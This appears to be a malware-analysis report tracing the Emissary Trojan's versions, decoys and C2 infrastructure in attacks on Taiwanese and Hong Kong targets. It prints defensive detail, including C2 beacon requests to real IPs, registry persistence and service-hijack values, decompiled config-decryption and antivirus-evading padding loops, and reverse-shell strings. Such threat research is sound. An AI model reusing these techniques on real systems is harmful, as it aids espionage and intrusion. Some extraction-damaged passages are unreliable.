Of note, this is\nthree years earlier than the oldest Elise sample we have found, suggesting this group has been active longer than previously\ndocumented. In addition, Emissary appears to only be used against Taiwanese or Hong Kong based targets, all of the\ndecoys are written in Traditional Chinese, and they use themes related to the government or military.\n\nWe also found several different versions of Emissary that had several iterative changes that show how the Trojan evolved\nover the years. One of the most interesting observations made during this analysis is that the amount of development effort\ndevoted to Emissary significantly increased after we published our Operation Lotus Blossom\n(http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/) report in June 2015, resulting in many new\nversions of the Emissary Trojan. In addition, we observed a TTP shift post publication with regards to their malware delivery;\nthey started using compromised but legitimate domains to serve their malware. Interestingly, the C2 infrastructure is also\nsomewhat different than that used by Elise.\n\n## Targeting\n\nIn contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region appropriate languages,\nall of the Emissary decoys we’ve collected are written in Traditional Chinese, which is used primarily in Taiwan and Hong\nKong. The targets we have identified are also limited to those two regions. Despite appearing to target a more limited\ngeographical range, Emissary targeted the government, higher education, and high tech companies with a mix of copy and\npasted news articles and documents that do not appear to be available online. Decoys include:\n\nAn Excel spreadsheet containing legitimate contact information for much of the Taiwanese government that does not\nappear to be available online.\nCopy and paste of a news article where the Deputy Commander of the Nanjing Military region, Wang Huanguang,\nresponds negatively to a 2014 magazine article from a respected US Taiwan scholar saying the odds of China and\nT i iti i l d di i th i ith tt t d ilit t k\n\n\n-----\n\nresidents in the lead up to the Shanghai Expo.\nCopy of the official Taiwan holiday schedule for 2016, which is the 105 anniversary of the current Taiwaneseth\ngovernment.\n\n(http://researchcenter.paloaltonetworks.com/wp-content/uploads/2016/02/Emissary-1.jpg)\n\nFigure 1: Partial screenshot of the response from Deputy Commander of the Nanjing Military Region Wang Huangguang.\n\n## Evolve to Survive: TTP Shifts and Infrastructure\n\nWe’ve expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog and we’ve found almost\nexclusive use of Dynamic DNS (DDNS) domains with only one purchased from a Chinese reseller. In contrast, the Elise\nsamples used a mix of actor-registered and DDNS, with the actor-registered serving as one of the data points we used to tie\nall of the activity together. While the use of DDNS can make tying activity together more difficult, and despite the new\nEmissary variants since our publication, two of the most recent C2s resolved to IPs used by Elise C2s detailed in Operation\nLotus Blossom. The Emissary samples typically have three hardcoded C2s that are a mix of IPs and domain names, with\none of the domains or IPs not being used by the other three C2s in a likely effort to avoid loss of control. A full IOC list is\nincluded at the end of this report.\n\nAlso new is the actors’ use of compromised legitimate Taiwanese websites to serve their malware, including the official\nwebsite of the Democratic Progressive Party. This is particularly interesting as Taiwan just held a closely watched\nPresidential election on 16 January where DPP candidate Tsai Ing-wen won. This marked the first time a woman was\nelected President of Taiwan and only the second time a member of the Kuomintang did not hold the office since being\nousted from China in 1949 when the Communist Party of China took power. In line with her party’s stance, she is widely\nseen as a proponent of an independent Taiwan and not in favor of reunification with the People’s Republic of China.\n\n## Malware Updates\n\nOur evidence suggests that malware authors created Emissary as early as 2009, which suggests that threat actors have\nrelied on this tool as a payload in cyber-espionage attacks for many years. The Emissary Trojan is a capable tool to gain a\nfoothold on a targeted system. While it lacks more advanced functionality like screen capturing, it is still able to carry out\nmost tasks desired by threat actors: exfiltration of files, ability to download and execute additional payloads, and gain\nremote shell access. It appears that threat actors have continually used this Trojan, and developed several updated versions\nof Emissary to remain undetected and fresh over time.\n\nWe analyzed all of the known Emissary samples to determine what changes the malware author made between the different\nversions of the Trojan. During our analysis, we examined when each sample was created based on its compile time and\nproduced a simple timeline, seen in Figure 2, to display the development efforts expended on the Emissary Trojan. It should\nbe noted that we know some Emissary samples have been used multiple times with different configurations, so the timeline\nonly shows when development activity took place on Emissary and should not be misconstrued to when Emissary was used\nin attacks.\n\n\n-----\n\nupdate that resulted in version 1.1 in June 2009. The Trojan did not receive much in the form of updates until September\n2011 when the author released version 2.0. Version 2.0 received one update in October 2013 before the malware author\nreleased version 3.0 in December 2014. The malware author released version 4.0 in March 2015, but curiously created a\nversion 3.0 sample afterwards on June 26, 2015, which was out-of-sequence from the incrementing versioning. Between\nAugust and November 2015 the malware author creates several new versions of Emissary, specifically 5.0, 5.1, 5.3 and 5.4\nin a much more rapid succession compared to development process in earlier versions.\n\n\n-----\n\n-----\n\n(http://researchcenter.paloaltonetworks.com/wpcontent/uploads/2016/02/emissary_compilation_timeline_with_olb_vertical1.png)\n\nFigure 2: Timeline of development efforts spent on Emissary\n\nThe out-of-sequence version 3.0 appears to be an early variant of version 5.0 based on significant similarities (discussed in\nthe changelog section) that are not seen in the original version 3.0 and other earlier versions of Emissary. One campaign\ncode associated with of the out-of-sequence version 3.0 sample was “3test”, suggesting the malware author created it for\ntesting purposes. The other campaign code associated with the out-of-sequence sample was “IC00001”, which could\ndenote an attack payload as it appears to be a plausible code to describe a campaign.\n\nWhile this may be coincidental, the out-of-sequence version 3.0 sample was created ten days after we published the\n[Operation Lotus Blossom (http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/) paper that](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)\nexposed the Elise Trojan that is closely related to Emissary. It is possible that the threat actors were prompted to make\nmalware changes in response to our research. Regardless of causation, the rapid development of new versions of Emissary\nsuggests that the malware authors are making frequent modifications to evade detection, which as a corollary suggests the\nthreat actors are actively using the Emissary Trojan as a payload in attacks.\n\n## Emissary Changelog\n\nIn this section, we discuss the changes observed between each version of Emissary. As this section is focused on changes,\nthe features and functionality are the same between Emissary versions unless otherwise mentioned.\n\n#### Version 1.0\n\n**Date: 5/12/2009**\n\n\n-----\n\n**Initial Release**\n\nThe initial loader Trojan writes Emissary to %SYSTEM%⧵WSPsvc.dll and installs it as a service, which will run the exported\nfunction “ServiceMain” within the Emissary Trojan to carry out its functionality.\n\nConfiguration data is stored in the last 1024 bytes of the payload, from which the Trojan will extract an 896 byte structure.\nThe configuration is decrypted with an algorithm that uses the XOR operation on each byte using the value at a different\noffset within the ciphertext.\n\nThe code will create the following registry keys:\n\n\n1\n2\n\n\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckCode\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckID\n\n\nEmissary uses the “CheckCode” registry key to store the encrypted configuration for the Trojan, while it stores a GUID that\nEmissary uses to uniquely identify the compromised host in the “CheckID” key.\n\nThe malware performs initial system information gathering and saves data to a file named TMP2548. The initial gathering\nrelies on a combination of the following commands executed by the command prompt:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ncommands executed by the command prompt:\n\nECHO VER\nVER\nECHO IPCONFIG /ALL\nIPCONFIG /ALL\nECHO NET LOCALGROUP ADMINISTRATORS\nNET LOCALGROUP ADMINISTRATORS\nECHO NET START\nNET START\nECHO GPRESULT /Z\nGPRESULT /Z\nECHO GPRESULT         /SCOPE COMPUTER /Z\nGPRESULT           /SCOPE COMPUTER /Z\nECHO SYSTEMINFO\nSYSTEMINFO\n\n\nEmissary parses command and control responses for “instru”, which will precede a GUID value that designates the\ncommand the C2 server wishes to execute on the system. The command handler does not use a nested if/else or switch\nstatement like most malware families, instead Emissary creates a structure that contains all of the available command\nGUIDs that it will iterate through each time the C2 supplies a GUID in order to determine which command the operator\nwishes to execute. Emissary can include up to 32 different commands within this data structure, but it appears the author\nhas decided to include six commands within the Trojan. The following denotes the command handler structure used by\nEmissary v1.0:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nstruct EMISSARY_COMMAND\n{\nCHAR guid[40];\nDWORD sub_function;\nDWORD arg1_subfunction;\nDWORD arg2_subfunction;\nDWORD arg3_subfunction;\n};\n\nstruct commandHandler\n{\nDWORD number_of_commands;\nDWORD unused;\nstruct EMISSARY_COMMAND cmd_0;\nstruct EMISSARY_COMMAND cmd_1;\nstruct EMISSARY_COMMAND cmd_2;\nstruct EMISSARY_COMMAND cmd_3;\nstruct EMISSARY_COMMAND cmd_4;\nstruct EMISSARY_COMMAND cmd_5;\n};\n\n\nTable 1 contains the commands available within the Emissary v1.0 command handler.\n\n|Command|Description|\n|---|---|\n|bac84b12-5b0b-491f- a885-8667d156394f|Upload file.|\n\n\n-----\n\nbbbf-ea5f914f8e65\n\ndb0e93e7-b46c-4cba- Update config.

The Emissary configuration is now encrypted using a custom\nalgorithm that uses the “srand” function to seed the “rand” function using a value of 2563. This seed value causes the\n“rand” function to generate the same values each time, which Emissary will use as a key along with the XOR operation.

The following is an example of the version 2.0 beacon, which contains the\nsame GUID and “op” values:\n\n\n1\n2\n3\n\n\nGET /0test/test/default.aspx HTTP/1.1\nhost: 163.20.127.27\nCookie: guid=af44f802-ba5c-4b3c-8c6b-2ea411058678; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6;\n\n\nVersion 2.0 also introduces a debug message logging system that includes verbose error messages that are accompanied\nby an error ID number. Error messages are written to the file %TEMP%⧵em.log. The following is a list of all possible debug\nmessages:\n\n\n-----\n\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\nemissarydll.cpp - 0x35 - InitApp() - Event create successful\nemissarydll.cpp - 0x3b - InitApp() - create work thread\nshell.cpp - 0x30 - SendShellOutputThread - PeekNamedPipe - Error : 0x%08x\nshell.cpp - 0x3e - SendShellOutputThread() : Timeout\nshell.cpp - 0x53 - SendShellOutputThread - ReadFile - Error : 0x%08x\nshell.cpp - 0x5b - SendShellOutputThread - send - Error : 0x%08x\nshell.cpp - 0x62 - SendShellOutputThread() : thread exit\nshell.cpp - 0x7f - RecvShellCmdThread - recv - Error : 0x%08x\nshell.cpp - 0x89 - RecvShellCmdThread - WriteFile - Error : 0x%08x\nshell.cpp - 0x8f - RecvShellCmdThread() : thread exit\nshell.cpp - 0xeb - Error occured : %s [%d]\nshell.cpp - 0xfa - TerminateThread Input Thread\nshell.cpp - 0x100 - TerminateThread Output Thread\nshell.cpp - 0x118 - SocketShell - Fail To Create Reverse Socket\nshell.cpp - 0x12f - SocketShell - Fail To Generate Reverse Shell\nshell.cpp - 0x13a - SocketShell - SocketShell - Fail To Generate Reverse Shell\nshell.cpp - 0x13e - SocketShell - Create Reverse Shell Thread OK\nconfig.cpp - 0x38 - RegCreateKeyEx error : %0x08x\nconfig.cpp - 0x46 - RegSetValueEx error : %0x08x\nconfig.cpp - 0x5e - ReadConfig - RegCreateKeyEx error : 0x%08x\nconfig.cpp - 0x66 - ReadConfig - RegQueryValueEx error : 0x%08x\nconfig.cpp - 0xab - find user: %s\nconfig.cpp - 0xbc - can not find proxy\nconfig.cpp - 0xc7 - get ProxySetting failed\nconfig.cpp - 0xd4 - find proxy server : %s\nrun.cpp -   0x75 - InitConfig: [g_ServerPath:%s] [g_ServerName:%s] [g_port:%d] [g_ServerUrl:%s]\nrun.cpp - 0x9d - InitConfig: [g_DelayTime:%d]\nrun.cpp - 0xbe - get proxy the last time used:%s\nrun.cpp - 0xc3 - server index:%d\nrun.cpp - 0xd9 - RetryTimes = %d\nrun.cpp - 0xec - connect %s error :%s\nrun.cpp - 0x10c - process a request ok.\nhttpclient.cpp - 0x98 - ASP.NET_SessionId长度异常:[%d][%s] (translation: ASP.NET_SessionId Length Exception:[%d][%s])\nhttpclient.cpp - 0xd0 - ******not connected !\nhttpclient.cpp - 0xf4 - read hread error : %s\nhttpclient.cpp - 0x102 - body length = 0\nhttpclient.cpp - 0x13d - decrypt error\"\nhttpclient.cpp - 0x211 - instruction : <instruction>\nhttpclient.cpp - 0x21d - no instruction guid\nhttpclient.cpp - 0x22c - OP_DOWNLOAD no local file name\nhttpclient.cpp - 0x23b - OP_UPLoad no local file name\nhttpclient.cpp - 0x249 - OP_UPLoad no local file name\nhttpclient.cpp - 0x242 - OP_UPLoad no local file name\nhttpclient.cpp - 0x25b - OP_EXECUTE no cmd list\nhttpclient.cpp - 0x262 - OP_EXECUTE no timeout\nhttpclient.cpp - 0x2b4 - OP_SHELL ip\nhttpclient.cpp - 0x2bb - OP_SHELL port\nhttpclient.cpp - 0x2dd - OP_CHANGECONFIG server1\nhttpclient.cpp - 0x2e4 - OP_CHANGECONFIG server2\nhttpclient.cpp - 0x2eb - OP_CHANGECONFIG server3\nhttpclient.cpp - 0x2f2 - OP_CHANGECONFIG timestr\nhttpclient.cpp - 0x2f9 - OP_CHANGECONFIG namestr\nhttpclient.cpp - 0x300 - OP_CHANGECONFIG guid\nhttpclient.cpp - 0x321 - not connected\nhttpclient.cpp - 0x361 - send msg error\nhttpdoinstruction.cpp - 0x28 - DownloadFile - LocalFileName=%s\nhttpdoinstruction.cpp - 0x5c - download file http head:%s\nhttpdoinstruction.cpp - 0x7a - download file ok\nhttpdoinstruction.cpp - 0xac - UploadFile - LocalFileName=%s\nhttpdoinstruction.cpp - 0xb4 - DownloadFile - Error - Open File [%S][0x%08x]\nhttpdoinstruction.cpp - 0xc7 - UploadFile:TotalLength=%d\nhttpdoinstruction.cpp - 0x124 - download file http head:%s\n\n\n**Date: 10/24/2013**\n\nSHA256: 9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3\n\nOriginal Name: NetPigeon_DLL.dll\n\nThis update to Emissary allowed the Trojan to run as a service. The configuration now contains settings for the Emissary\nservice, which the Trojan will store in and access from the following registry keys:\n\nSOFTWARE⧵Microsoft⧵VBA⧵Serv -> Service Name\n\nSOFTWARE⧵Microsoft⧵VBA⧵VbaList -> Binary Path for the Service\n\nAlso, this version of Emissary was created using Microsoft Foundation Classes (MFC) to carry out a majority of its\nfunctionality. For instance, instead of manually building an HTTP request as in previous versions, this version uses the MFC\nfunctions to create the HTTP request and send it to the C2 server:\n\nCInternetSession::CInternetSession\nCInternetSession::GetHttpConnection\n\n\n-----\n\nCInternetSession::SetCookie\nCHttpFile::SendRequest\n\nUsing these classes creates a significantly different HTTP request sent to the C2 server, but the functionality of obtaining\ninstructions from the C2 is the same.

The installation and loading portion of the Trojan is called using an exported function named “Setting”, which\nmoves the file to:\n\n\n1 %TEMP%\\Remdisk.dll\n\n\nThe loading portion of this version of Emissary checks the permissions of the current user and either installs Emissary as a\nservice or as a standalone Trojan. To install as a service, the loader will enumerate the services on the system looking for\nservices running under the “netsvcs” group, and it will attempt to hijack the first “netsvcs” service by replacing the\n“ServiceDLL” parameter to point to the Emissary DLL. For instance, during the analysis period, the installation code\nchanged the following registry key of the AppMgmt:\n\n\n1 HKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll: \"%SystemRoot%\\System32\\appmgmts.dll\"\n\n\nto\n\n\n1 HKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll: \"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll\"\n\n\nIf the user does not have permissions to add a service, the installation routine attempts to add persistence by creating the\nfollowing registry key that will run the functional code within Emissary via an exported function named “DllRegister”:\n\n\n1 Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Resolves: \"Rundll32.exe C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll,Dll\n\n\nThis version of emissary has its configuration appended to the end of the DLL, specifically starting at offset 0xc600. The\nfollowing code accesses the configuration embedded within the DLL and decrypts it using a single byte XOR algorithm\nusing 65 as the key:\n\n\n1\n2\n3\n4\n5\n6\n\n\nSetFilePointer(v2, 0xC600, 0, 0);\nReadFile(h_emissary_dll_file, buffer_for_config, 0x1D0u, &NumberOfBytesRead, 0);\niteration_count = 0;\ndo\n*(iteration_count++ + buffer_for_config) += 65;\nwhile ( iteration_count < 0x1D0 );\n\n\nThis algorithm differs from the algorithm introduced in Emissary version 2.0 that used the srand and rand functions to\ngenerate a key to use in conjunction with the XOR operation. With the configuration embedded within the Emissary DLL,\neach Emissary version 4 0 sample will have a different hash as the configuration data changes\n\n\n-----\n\nin the following:\n\n\n1\n2\n3\n4\n5\n\n\nGET /lightserver/Default.aspx HTTP/1.0\nCache-Control: no-cache\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 210.209.121.92\nCookie: guid=7DA53AE4-C155-40b3-8EB3-60C4FCE99025; op=1635b097-ffe4-4711-89e6-7f8c7f4cdca6\n\n\n#### Version 3.0: Out-of-sequence\n\n**Date: 6/25/2015**\n\nSHA256: 70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\n\nOriginal Name: IISDLL.dll\n\n**Major Overhaul**\n\nThe compilation time of one sample of Emissary version 3.0 on June 25, 2015 appears out of order, as it occurs after the\ncompilation of Emissary version 4.0. The differences between this out of order sample compared to the other known version\n3.0 sample, as well as version 4.0 for that matter, include a dramatic change in configuration storage and the handling of\ncommands. Also, the files stored on the system have different names than Emissary versions in the past, which are:\n\n\n1\n2\n3\n4\n5\n\n\n%TEMP%\\000IISA758C8FEAE5F.TMP -> Log file\n\n%APPDATA%\\LocalData\\75BD50EC.DAT -> Configuration file\n\n%APPDATA%\\LocalData\\A08E81B411.DAT -> Emissary DLL\n\n\nThis version of Emissary is designed to be injected into an Internet Explorer process by its associated loader Trojan, which\nmarks the first time Emissary executes through DLL injection.\n\nThis version of Emissary also has a different configuration structure than prior versions. The configuration is no longer stored\nin the registry; rather it is saved to a file named 75BD50EC.DAT. The Emissary DLL will skip to offset 0x488 within this file\nand read the next 132 bytes, which it will decrypt with a new algorithm as seen in the following:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nSetFilePointer(h_config_file_1, 0x488, 0, 0);\nReadFile(h_config_file, buffer_for_config, 132u, &NumberOfBytesRead, 0);\nCloseHandle(h_config_file);\nsrand(0xA03u);\niteration_count = 0;\ndo\n*(buffer_for_config + iteration_count++) ^= rand() % 128;\nwhile ( iteration_count < 0x84 );\n\n\nThe configuration structure has also changed as well, with Emissary now using the following structure:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nstruct emissary_new_config {\nWORD Emissary_version_major;\nWORD Emissary_version_minor;\nCHAR[36] GUID_for_sample;\nWORD Unknown1;\nCHAR[128] Server1;\nCHAR[128] Server2;\nCHAR[128] Server3;\nCHAR[128] CampaignName;\nCHAR[550] Unknown2;\nWORD Delay_interval_seconds;\n};\n\n\nThis version of Emissary also introduced a new command handler that uses number-based commands instead of the GUID\ncommands seen in prior versions of Emissary. The functionality of the commands are the same, however, the commands\nthemselves are invoked using a number. Table 2 contains a list of available commands and a brief description of the\nfunctionality carried out by the command.\n\n**Command** **Description**\n\n102 Upload a file to the C2 server.\n\n103 Executes a specified command.\n\n104 Download file from the C2 server.\n\n105 Update configuration file.\n\n|Command|Description|\n|---|---|\n|102|Upload a file to the C2 server.|\n|103|Executes a specified command.|\n|104|Download file from the C2 server.|\n\n\n-----\n\n|107|Updates the Trojan with a new executable.|\n|---|---|\n\n\nTable 2: New Emissary command handler\n\nThe network beacon sent from this version of Emissary is very similar to the beacon first introduced in Emissary version 2.0;\nhowever, the “op” value of “101” is hardcoded for the beacon and replaces the GUID based op designator to match the new\ncommand handler. The following is an example of the network beacon generated by this version of Emissary:\n\n\n1\n2\n3\n4\n5\n\n\nGET /default.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 101.55.33.92\nCache-Control: no-cache\nCookie: guid=cae5e213-395a-4023-9a12-f78d3c4718e5; op=101\n\n\n#### Version 5.0\n\n**Date: 8/25/2015**\n\nSHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634, Original Name: WinDLL.dll\n\nEmissary version 5.0 closely resembles the out-of-order version 3.0 sample, which suggests that the malware author just\nforgot to change the version number of the out of order sample. While the configuration and Emissary DLL filenames used\nby the version 5.0 Emissary sample are the same as the out-of-order version 3.0 sample, the log file name differs but only\nslightly, as seen in the following list of related files:\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n%TEMP%\\000A758C8FEAE5F.TMP -> Log File\n\n%APPDATA%\\LocalData\\75BD50EC.DAT -> Configuration file\n\n%APPDATA%\\LocalData\\A08E81B411.DAT -> Emissary DLL\n\n%APPDATA%\\LocalData\\ishelp.dll -> Loader DLL\n\n\nVersion 5.0 uses numbers within its command handler and the same configuration structure as the out-of-order version 3.0.\nThe only major change in 5.0 is the ability to obtain a compromised system’s external IP address by performing an HTTP\nGET request to “http://showip.net/index.php”. The code will parse the response from this webserver for the following to\nobtain the system’s IP address:\n\n\n1 <input id=\"checkip\" type=\"text\" name=\"check_ip\" value=\"[IP address parsed]\" />\n\n\nThe SID value sent from the C2 server is encrypted using an algorithm that uses the XOR operation on the data using 0x76\nas the key on the first byte and the resulting cleartext byte as the key on the next byte and so on. The network beacon sent\nfrom this version of Emissary visually resembles the out-of-order version, with the addition of a field “SHO” that contains the\nIP address of the compromised host. The following is an example of the Emissary version 5.0 network beacon, which is also\nthe same in versions 5.1, 5.3 and 5.4 as well:\n\n\n1\n2\n3\n4\n5\n\n\nGET /default.aspx HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 101.55.33.95\nCache-Control: no-cache\nCookie: guid=8cdef38c-808a-4e29-af6e-7386f02d28f1; op=101; SHO=172.16.107.130\n\n\n#### Version 5.1\n\n**Date: 9/29/2015**\n\nSHA256: 375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\n\nOriginal Name: WinDLL.dll\n\nFor version 5.1 the malware author took out the exception handling in the Upload File command and obfuscated two strings\nwithin the Trojan to avoid detection. The strings exist in the Trojan in encrypted form and are decrypted using an algorithm\nthat uses addition to each byte of ciphertext, using 65 (“A”) as a key. The obfuscated strings, as seen below, involve the\nfilename of the log file and the command prompt executable used to create the remote shell:\n\n\n1\n2\n\n\n\\xEF\\xEF\\xEF\\x00\\xF6\\xF4\\xF7\\x02\\xF7\\x05\\x04\\x00\\x04\\xF4\\x05\\xED\\x13\\x0C\\x0F = 000A758C8FEAE5F.TMP\n\\x22\\x2C\\x23\\xED\\x24\\x37\\x24 = cmd.exe\n\n\n**Date: 10/14/2015**\n\nSHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\n\nOriginal Name: WinDLL.dll\n\n\n-----\n\n**Date: 11/7/2015**\n\nSHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\n\nOriginal Name: WinDLL.dll\n\nEmissary 5.3 moved some code used to create the remote shell out of a sub-function in an attempt to evade signatures\nused to detect the remote shell creation. For instance, in Emissary 5.1 the command handler would call an initial subfunction\nthat would then call a second subfunction to carry out the activities to create and interact with the remote shell. In 5.3, the\ncommand handler calls an initial subfunction that carries out the activities to create and interact with the remote shell.\n\n#### Version 5.4\n\n**Date: 11/23/2015**\n\nSHA256: 69b1d5454abe2475257defd9962a24a92411212c4f592de8765369a97f26c037 (Base DLL with junk data removed)\n\nOriginal Name WinDLL.dll\n\nVersion 5.4 of Emissary was the basis for the blog “ELISE: Security Through Obesity\n(http://pwc.blogs.com/cyber_security_updates/2015/12/elise-security-through-obesity.html)” by Michael Yip of PWC. This\nblog provides a great analysis of this version of Emissary and we highly suggest reading it to become familiar with the\nTrojan.\n\nThere is one difference in the functional code between Emissary versions 5.3 and 5.4, which involves the removal of the\ncommand ‘107’ used to update the Trojan. The string ‘107’ still exists within the Trojan, however, the command handler does\nnot check the C2 response for this command and the code used to update the Trojan has been removed.\n\nThe major difference between Emissary version 5.4 and all previous versions is how the Trojan is saved and loaded. First,\nthe filenames of the various components of Emissary changed to the following; however, the filename for debug logs has\nnot changed:\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n%APPDATA%\\Programs\\Syncmgr.dll -> Loader Trojan\n\n%APPDATA%\\Programs\\60HGBC00.DAT -> Configuration File\n\n%APPDATA%\\Programs\\WEB2013BW6.DAT -> Emissary Trojan\n\n%TEMP%\\000A758C8FEAE5F.TMP -> Log file\n\n\nIn addition to file name changes, the biggest (pardon the pun) change involves the Loader Trojan (Syncmgr.dll) appending\njunk data to the end of the Emissary DLL file to make incredibly large files. The reason for creating such large files is to trick\nantivirus applications into not scanning the file, as it could exceed the maximum size of files the antivirus can scan (even\nVirusTotal has a maximum file size of 128MB). For instance, the following pseudo code contains two loops that will end up\nappending 524,288,000 bytes to the end of file, resulting in a DLL that exceeds 500MB in size:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nWriteFile(hFile, buf_EmissaryDllFromResource, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0);\nbuf_junkData = 0;\nret_time = time(0);\nsrand(ret_time);\nfor ( i = 0; i < 51200; ++i )\n{\nfor ( j = 0; j < 640; ++j )\n{\nrandom_byte = rand() % 255;\noffset_in_buff_junkData = &buf_junkData + 16 * j;\ndword_junkData = 0x1010101 * random_byte;\n*offset_in_buff_junkData = dword_junkData;\n*(offset_in_buff_junkData + 1) = dword_junkData;\n*(offset_in_buff_junkData + 2) = dword_junkData;\n*(offset_in_buff_junkData + 3) = dword_junkData;\n}\nWriteFile(hFile, &buf_junkData, 0x2800u, &nNumberOfBytesToWrite, 0);\n}\n\n\nWith the new filenames, malware persistence is achieved via the following registry key:\n\n\n1 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Syncmgr: \"rundll32.exe \"C:\\Documents and Settings\\[username]>\\Applica\n\n\n**Date: 11/24/2015**\n\nSHA256: bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636 (Base DLL with junk data removed)\n\nOriginal Name: WinDLL.dll\n\nIn another attempt to avoid detection based on PE header hashes the Trojan was recompiled without making any changes\n\n\n-----\n\nThe actors using Emissary, who were previously reported as behind Operation Lotus Blossom, have been active for at least\nseven years in Southeast Asia. They are persistent, evolve over time, and have enough resources to have multiple custom\nRATs that receive regular updates. The targeting is largely military or government, with some cases of higher education and\nhigh tech companies. They also have the ability to select and use appropriate decoys in multiple Asian languages that\nappear legitimate.\n\nThe use of Emissary appears to be focused only on Taiwan and Hong Kong, with regular malware updates to avoid\ndetection and to increase the odds of success. Of particular note, there is an interesting coincidence between the timing of\nthe publication of our Operation Lotus Blossom report and a flurry of Emissary updates. The first occurred ten days after\npublication and was followed by updates over increasingly shorter time frames, starting at roughly every three months and\nprogressing to monthly by the final version discussed here. Until that publication, according to our research Emissary was\nupdated roughly every two years. This indicates the threat actors may take note of threat intelligence reporting and are fully\ncapable of making immediate changes when deemed necessary.\n\nIn addition to the malware evolution, the actors also shifted from solely spear-phishing targets with attachments to also\ncompromising legitimate websites to host malware. The consistent updates to the Trojan and the shift in the actor’s TTPs\nsuggests that this threat will continue to use Emissary in future espionage related attacks.\n\n[We have updated the Emissary (https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary) tag for Palo Alto Networks](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary)\nAutoFocus users to track this threat using the indicators discussed in this blog.\n\n#### Emissary Delivery
